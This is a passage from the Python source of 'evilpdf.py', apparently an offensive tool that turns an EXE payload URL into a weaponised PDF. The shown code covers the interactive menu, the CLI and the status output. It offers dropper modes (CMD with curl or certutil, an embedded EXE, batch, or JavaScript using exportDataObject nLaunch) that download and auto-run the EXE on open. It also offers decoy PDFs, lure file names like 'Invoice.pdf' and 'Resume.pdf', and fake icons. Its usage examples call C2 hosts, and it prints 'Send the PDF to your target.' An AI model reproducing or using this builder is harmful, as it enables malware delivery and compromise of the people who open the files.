                      f"{C.CYAN}{value}{C.RESET}")
            row("Payload URL", self.exe_url)
            row("EXE auto-name", self.auto_exe_name)
            row("Embedded file", self.embed_name if self.embed
                               else "None (URL mode only)")
            row("Embed mode", self.embed or "url")
            if self.icon_applied:
                row("Icon", "applied: " + str(self.icon))
            elif self.embed == "exe" and self.icon:
                row("Icon", "FAILED: " + str(self.icon))
            else:
                row("Icon", "none")
            row("Batch source", self.batch_file if self.embed == "batch"
                               else "built-in dropper")
            row("JS source", self.js_file if self.embed == "js"
                            else "built-in")
            row("Victim sees", self.decoy_pdf or
                              ("custom text" if self.custom_text else "default page"))
            row("New tab", "Yes (browser opens EXE URL)")
            row("Auto-execute", "Yes (exportDataObject nLaunch:2)"
                               if self.embed else "tab only")
            row("Downloader", "your batch file" if self.embed == "batch"
                             else "curl (+ certutil fallback)" if self.embed in ("cmd", "js")
                             else "direct embed / browser tab")
            hr('═')
            print()

            status("⚡", "EVIL PDF READY! On open: new tab ➜ EXE downloaded "
                        "➜ EXE opens automatically!", C.MAGENTA)
            return True

        except Exception as e:
            print(f"  {C.RED}[✗] Error generating PDF: {e}{C.RESET}")
            if DEBUG[0]:
                import traceback
                traceback.print_exc()
            return False


# ══════════════════════════════════════════════════════════════════
#  OPEN RESULT
# ══════════════════════════════════════════════════════════════════

def open_pdf(path):
    try:
        if not os.path.isfile(path):
            print(f"  {C.RED}[✗] not found: {path}{C.RESET}")
            return
        if sys.platform.startswith('win'):
            os.startfile(path)
        elif sys.platform == 'darwin':
            subprocess.run(['open', path])
        else:
            subprocess.run(['xdg-open', path])
        status("✓", f"Opened locally: {path}")
    except FileNotFoundError:
        print(f"  {C.RED}[✗] no opener found — open manually: {path}{C.RESET}")
    except Exception as e:
        print(f"  {C.RED}[✗] failed to open: {e}{C.RESET}")


# ══════════════════════════════════════════════════════════════════
#  NUMBERED HACKER MENU
# ══════════════════════════════════════════════════════════════════

def ask(prompt, default=None):
    suffix = f" {C.DIM}[{default}]{C.RESET}" if default else ""
    val = input(f"  {C.GREEN}➤{C.RESET}{prompt}{suffix} : ").strip()
    return val or (default or "")


def ask_text_block():
    """Prompt for page text, enforcing TEXT_MIN..TEXT_MAX characters."""
    print(f"  {C.DIM}Type the text the victim will see. Use | between lines.")
    print(f"  Allowed length: {TEXT_MIN}-{TEXT_MAX} characters.")
    print(f"  Empty input cancels.{C.RESET}")
    while True:
        raw = input(f"  {C.GREEN}➤{C.RESET}Page text : ").strip()
        if not raw:
            status("i", "Page text cancelled — keeping previous value.", C.CYAN)
            return ""
        n = len(raw)
        if n < TEXT_MIN:
            status("✗", f"Too short: {n} chars, need at least {TEXT_MIN}.", C.RED)
            continue
        if n > TEXT_MAX:
            status("✗", f"Too long: {n} chars, max is {TEXT_MAX}.", C.RED)
            continue
        status("✓", f"Accepted: {n}/{TEXT_MAX} characters.", C.GREEN)
        return raw


def ask_existing_file(prompt, exts=None):
    """Prompt for a path until it exists (and matches exts if given)."""
    while True:
        p = ask(prompt + " (empty = cancel)")
        if not p:
            return ""
        p = os.path.abspath(os.path.expanduser(p))
        if not os.path.isfile(p):
            status("✗", f"File not found: {p}", C.RED)
            continue
        if exts and not p.lower().endswith(tuple(exts)):
            status("!", f"Unexpected extension — expected {exts[0]}", C.YELLOW)
        return p


def set_decoy(s):
    p = ask_existing_file("Path to YOUR PDF (victim will see it)")
    if not p:
        return
    try:
        with open(p, 'rb') as f:
            if not f.read(8).startswith(b'%PDF-'):
                status("✗", "That file is not a valid PDF.", C.RED)
                return
    except OSError as e:
        status("✗", f"Cannot read it: {e}", C.RED)
        return
    s["decoy"] = p
    status("✓", f"Decoy set: {C.CYAN}{p}{C.RESET} "
                f"({C.YELLOW}{os.path.getsize(p):,}{C.RESET} bytes)")
    if ask("Open it now for review? (y/N)", "n").lower().startswith('y'):
        open_pdf(p)


def choose_embed_mode(s):
    print(f"""  {C.DIM}embed modes:
  [1] cmd   = built-in CMD dropper (recommended)
  [2] exe   = embed the real EXE directly (icon option works here)
  [3] url   = only open a new tab / no embed
  [4] batch = embed YOUR OWN batch file from a path
  [5] js    = load the /OpenAction JavaScript from a text file{C.RESET}""")
    m = ask("Mode (1-5 or name)", s["embed"])
    m = m.lower()
    alias = {"1": "cmd", "2": "exe", "3": "url", "4": "batch", "5": "js"}
    m = alias.get(m, m)
    if m == "batch":
        p = ask_existing_file("Path to your batch file (.bat/.cmd/.txt)",
                              ('.bat', '.cmd', '.txt'))
        if not p:
            status("!", "Batch path not set — mode stays " + s["embed"], C.YELLOW)
            return
        try:
            body, raw = read_text_file(p)
        except OSError as e:
            status("✗", f"Cannot read batch file: {e}", C.RED)
            return
        if not body.strip():
            status("✗", "Batch file is empty.", C.RED)
            return
        s["batch"] = p
        status("✓", f"Batch file set: {C.CYAN}{p}{C.RESET} "
                    f"({C.YELLOW}{len(raw):,}{C.RESET} bytes, "
                    f"{len(body.splitlines())} lines)")
        if not re.search(r'(?im)^\s*@?echo', body):
            status("!", "No @echo off in that file — the victim will see the "
                        "command trace.", C.YELLOW)
        s["embed"] = "batch"
        return
    if m == "js":
        p = ask_existing_file("Path to your JavaScript text file (.js/.txt)",
                              ('.js', '.txt'))
        if not p:
            status("!", "JS path not set — mode stays " + s["embed"], C.YELLOW)
            return
        try:
            js_src, _raw = read_text_file(p)
        except OSError as e:
            status("✗", f"Cannot read JS file: {e}", C.RED)
            return
        if not js_src.strip():
            status("✗", "JS file is empty.", C.RED)
            return
        s["js"] = p
        status("✓", f"JS file set: {C.CYAN}{p}{C.RESET} "
                    f"({C.YELLOW}{len(js_src):,}{C.RESET} chars)")
        if "exportDataObject" not in js_src:
            status("!", "No exportDataObject() in that file — the embedded "
                        "dropper will not auto-launch.", C.YELLOW)
        s["embed"] = "js"
        return
    if m in ("cmd", "exe", "url"):
        s["embed"] = m
        status("i", f"Embed mode: {C.CYAN}{m}{C.RESET}", C.CYAN)
    else:
        status("!", f"Unknown mode: {m}", C.YELLOW)


def menu():
    print(BANNER)
    s = {"url": "", "name": "", "out": ".", "decoy": "", "text": "",
         "alias": "", "embed": "cmd", "icon": "", "batch": "", "js": ""}

    while True:
        hr()
        print(f"  {C.BOLD}{C.CYAN}EVILPDF MAIN MENU:{C.RESET}")
        print(f"""{C.GREEN}{C.BOLD} [ 1]{C.RESET} Set EXE payload URL        {C.DIM}(now: {s['url'] or 'not set'}){C.RESET}
{C.GREEN}{C.BOLD} [ 2]{C.RESET} Set evil PDF file name     {C.DIM}(now: {s['name'] or 'not set'}){C.RESET}
{C.GREEN}{C.BOLD} [ 3]{C.RESET} Set save path              {C.DIM}(now: {s['out']}){C.RESET}
{C.GREEN}{C.BOLD} [ 4]{C.RESET} MY OWN PDF as victim view   {C.DIM}(decoy: {s['decoy'] or 'not set'}){C.RESET}
{C.GREEN}{C.BOLD} [ 5]{C.RESET} Custom page text           {C.DIM}({'set, ' + str(len(s['text'])) + ' chars' if s['text'] else 'default page'}){C.RESET}
{C.GREEN}{C.BOLD} [ 6]{C.RESET} Rename embedded file       {C.DIM}(auto: name from URL){C.RESET}
{C.GREEN}{C.BOLD} [ 7]{C.RESET} Embed mode                 {C.DIM}(now: {s['embed']}){C.RESET}
{C.GREEN}{C.BOLD} [ 8]{C.RESET} Toggle DEBUG mode           {C.DIM}(now: {'ON' if DEBUG[0] else 'off'}){C.RESET}
{C.GREEN}{C.BOLD} [ 9]{C.RESET} Show current settings
{C.GREEN}{C.BOLD} [10]{C.RESET} {C.BOLD}GENERATE EVIL PDF{C.RESET}
{C.GREEN}{C.BOLD} [11]{C.RESET} Generate (URL mode only, no embed)
{C.GREEN}{C.BOLD} [12]{C.RESET} {C.YELLOW}Open the generated PDF locally{C.RESET}
{C.GREEN}{C.BOLD} [13]{C.RESET} ICON for embedded EXE       {C.DIM}(embed-exe mode){C.RESET}
{C.GREEN}{C.BOLD} [ 0]{C.RESET} Exit""")
        hr()
        ch = ask("Option", "10")

        if ch == "1":
            s["url"] = ask("EXE URL (http/https)")
        elif ch == "2":
            s["name"] = ask("Evil PDF file name")
        elif ch == "3":
            s["out"] = ask("Save path", s["out"])
        elif ch == "4":
            set_decoy(s)
        elif ch == "5":
            raw = ask_text_block()
            if raw:
                s["text"] = raw
        elif ch == "6":
            s["alias"] = ask("Embedded file name (empty = auto from URL)")
        elif ch == "7":
            choose_embed_mode(s)
        elif ch == "8":
            DEBUG[0] = not DEBUG[0]
            status("i", f"DEBUG {'ON' if DEBUG[0] else 'OFF'}", C.CYAN)
        elif ch == "9":
            print(f"""
  {C.BOLD}CURRENT SETTINGS:{C.RESET}
  {C.GREEN}►{C.RESET} URL         : {C.CYAN}{s['url'] or '(not set)'}{C.RESET}
  {C.GREEN}►{C.RESET} Name        : {C.CYAN}{s['name'] or '(not set)'}{C.RESET}
  {C.GREEN}►{C.RESET} Save path   : {C.CYAN}{s['out']}{C.RESET}
  {C.GREEN}►{C.RESET} Decoy PDF   : {C.CYAN}{s['decoy'] or '(default page)'}{C.RESET}
  {C.GREEN}►{C.RESET} Page text   : {C.CYAN}{(str(len(s['text'])) + ' chars') if s['text'] else '(default)'}{C.RESET}
  {C.GREEN}►{C.RESET} Alias       : {C.CYAN}{s['alias'] or '(auto from URL)'}{C.RESET}
  {C.GREEN}►{C.RESET} Embed mode  : {C.CYAN}{s['embed']}{C.RESET}
  {C.GREEN}►{C.RESET} Batch file  : {C.CYAN}{s['batch'] or '(built-in dropper)'}{C.RESET}
  {C.GREEN}►{C.RESET} JS file     : {C.CYAN}{s['js'] or '(built-in)'}{C.RESET}
  {C.GREEN}►{C.RESET} Icon        : {C.CYAN}{s['icon'] or '(none)'}{C.RESET}""")
        elif ch in ("10", "11"):
            url  = s["url"]  or ask("EXE URL")
            name = s["name"] or ask("Evil PDF file name")
            if url.startswith("http"):
                status("i", f"Auto-detected EXE name: "
                            f"{C.CYAN}{url_filename(url)}{C.RESET}", C.CYAN)
            embed = s["embed"] if ch == "10" else "url"
            text = [t for t in s["text"].split('|')] if s["text"] else None
            icon = s["icon"] or None
            batch = s["batch"] or None
            jsf = s["js"] or None
            if icon and embed != "exe":
                status("!", "Icon is only applied in 'exe' embed mode — "
                            "it will be ignored for this run.", C.YELLOW)
            if embed == "batch" and not batch:
                status("!", "batch mode selected but no batch file set — "
                            "switching to cmd mode.", C.YELLOW)
                embed = "cmd"
            if embed == "js" and not jsf:
                status("!", "js mode selected but no JS file set — "
                            "switching to cmd mode.", C.YELLOW)
                embed = "cmd"
            gen = EvilPDF(url, name, s["out"], embed=embed,
                         decoy_pdf=(s["decoy"] or None),
                         custom_text=text,
                         alias=(s["alias"] or None),
                         icon=icon, batch_file=batch, js_file=jsf)
            if not gen.validate():
                status("✗", "Invalid input — fix the errors above.", C.RED)
                continue
            if gen.generate():
                print(f"\n  {C.BOLD}{C.GREEN}[✔] EXPLOIT READY!{C.RESET}")
                print(f"  {C.MAGENTA}Send the PDF to your target.{C.RESET}")
                print(f"  {C.YELLOW}On open: new tab ➜ EXE downloaded "
                      f"➜ EXE opens!{C.RESET}\n")
        elif ch == "12":
            name = s["name"] or ask("Evil PDF file name")
            path = os.path.join(os.path.abspath(s["out"]),
                                name if name.endswith('.pdf') else name + '.pdf')
            open_pdf(path)
        elif ch == "13":
            s["icon"] = ask("Path to .ico file for the embedded EXE "
                            "(empty = no icon)")
            if s["icon"]:
                ok, why = validate_ico(s["icon"])
                if ok:
                    status("✓", "Icon file looks valid.")
                else:
                    status("✗", f"Invalid icon: {why}", C.RED)
                    s["icon"] = ""
        elif ch == "0":
            status("i", "Bye, operator. Stay sneaky.", C.CYAN)
            return 0
        else:
            status("!", f"Unknown option: {ch}", C.YELLOW)


# ══════════════════════════════════════════════════════════════════
#  CLI MODE
# ══════════════════════════════════════════════════════════════════

def cli():
    p = argparse.ArgumentParser(
        prog="evilpdf.py",
        description=f"EVILPDF v{__version__} — EXE ➜ evil PDF exploit generator. "
                    "On open: new browser tab + embedded dropper downloads and "
                    "opens the EXE automatically.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  python3 evilpdf.py --menu
  python3 evilpdf.py -u http://10.0.0.5/payload.exe -n "Invoice.pdf"
  python3 evilpdf.py -u http://c2/x.exe -n "Resume.pdf" --decoy real_resume.pdf
  python3 evilpdf.py -u http://c2/x.exe -n "Doc.pdf" --text "Bank Statement|Please wait..."
  python3 evilpdf.py -u http://c2/x.exe -n "Doc.pdf" --alias "Invoice.exe" --embed-exe
  python3 evilpdf.py -u http://c2/x.exe -n "D.pdf" --embed-exe --icon myicon.ico --open
  python3 evilpdf.py -u http://c2/x.exe -n "D.pdf" --batch my_dropper.bat
  python3 evilpdf.py -u http://c2/x.exe -n "D.pdf" --js my_openaction.js --alias run.cmd
""")
    p.add_argument('--menu', action='store_true',
                   help='launch the numbered interactive menu (default)')
    p.add_argument('--url', '-u', default='', help='EXE payload URL')
    p.add_argument('--name', '-n', default='', help='evil PDF file name')
    p.add_argument('--out', '-o', default='.', help='save directory')
    p.add_argument('--decoy', metavar='PDF',
                   help='use YOUR OWN PDF as what the victim sees')
    p.add_argument('--text', default='',
                   help=f'custom page text lines, separated by | '
                        f'({TEXT_MIN}-{TEXT_MAX} chars, no decoy mode)')
    p.add_argument('--alias', default='',
                   help='rename the embedded file (default: auto from URL)')
    p.add_argument('--embed-exe', action='store_true',
                   help='embed the raw EXE directly (classic nLaunch mode)')
    p.add_argument('--batch', metavar='FILE', default='',
                   help='embed YOUR OWN batch file instead of the built-in '
                        'CMD dropper')
    p.add_argument('--js', metavar='FILE', default='',
                   help='load the /OpenAction JavaScript from this text file '
                        'instead of the built-in script')
    p.add_argument('--url-mode', '--no-embed', action='store_true',
                   help='no embedded file — only open a new tab/download')
    p.add_argument('--icon', metavar='ICO', default='',
                   help='path to a .ico file stamped INTO the embedded EXE '
                        '(embed-exe mode only)')
    p.add_argument('--open', action='store_true',
                   help='open the generated PDF locally after creation')
    p.add_argument('--debug', action='store_true',
                   help='debug: show objects, offsets, decoy parse, JS')
    p.add_argument('--version', action='version',
                   version=f'EVILPDF v{__version__}')
    args = p.parse_args()

    if args.menu or not (args.url and args.name):
        return menu()

    if args.debug:
        DEBUG[0] = True

    if args.url_mode:
        embed = "url"
    elif args.embed_exe:
        embed = "exe"
    elif args.batch:
        embed = "batch"
    elif args.js:
        embed = "js"
    else:
        embed = "cmd"

    text = [t for t in args.text.split('|')] if args.text else None

    gen = EvilPDF(args.url, args.name, args.out, embed=embed,
                  decoy_pdf=(args.decoy or None), custom_text=text,
                  alias=(args.alias or None), debug=args.debug,
                  icon=(args.icon or None), batch_file=(args.batch or None),
                  js_file=(args.js or None))

    print(BANNER)
    print(f"  {C.BOLD}{C.GREEN}[CONFIG]{C.RESET}")
    def cfg(label, val):
        print(f"  {C.CYAN}►{C.RESET} {label:<12}: {C.YELLOW}{val}{C.RESET}")
    cfg("EXE URL", args.url)
    cfg("PDF Name", args.name)
    cfg("Save Path", args.out)
    cfg("Embed mode", embed)
    cfg("Decoy PDF", args.decoy or "(default page)")
    cfg("Page text", (str(len(args.text)) + " chars") if args.text else "(default)")
    cfg("Alias", args.alias or "(auto from URL)")
    cfg("Batch file", args.batch or "(built-in dropper)")
    cfg("JS file", args.js or "(built-in)")
    cfg("Icon", args.icon or "(none)")
    print(f"  {C.BLUE}{'─' * 58}{C.RESET}\n")

    if not gen.validate():
        print(f"\n  {C.RED}{C.BOLD}[✘] INVALID INPUT — fix the errors above.{C.RESET}\n")
        return 1
    if not gen.generate():
        print(f"\n  {C.RED}{C.BOLD}[✘] GENERATION FAILED.{C.RESET}\n")
        return 1

    if args.open:
        open_pdf(gen.output_file)

    print(f"\n  {C.BOLD}{C.GREEN}[✔] EXPLOIT READY!{C.RESET}")
    print(f"  {C.MAGENTA}Send the PDF to your target.{C.RESET}")
    print(f"  {C.YELLOW}On open: new tab ➜ EXE downloaded "
          f"➜ EXE opens automatically!{C.RESET}\n")
    return 0


def main():
    init_ansi()
    nocolor_if_dumb()
    sys.exit(cli())


if __name__ == '__main__':
    main()
